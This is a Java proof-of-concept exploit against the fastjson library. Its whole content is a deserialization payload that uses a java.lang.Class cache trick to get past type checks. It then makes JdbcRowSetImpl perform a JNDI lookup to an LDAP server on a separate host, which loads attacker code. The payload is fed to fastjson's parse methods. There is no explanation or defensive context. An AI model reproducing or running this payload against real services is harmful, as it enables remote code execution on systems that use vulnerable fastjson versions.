import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
public class poc {
    public static void main(String[] args) throws Exception {
        String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.160.128:9999/exp\",\"autoCommit\":true}}";
        JSON.parse(payload);
        JSONObject.parseObject(payload);
    }
}
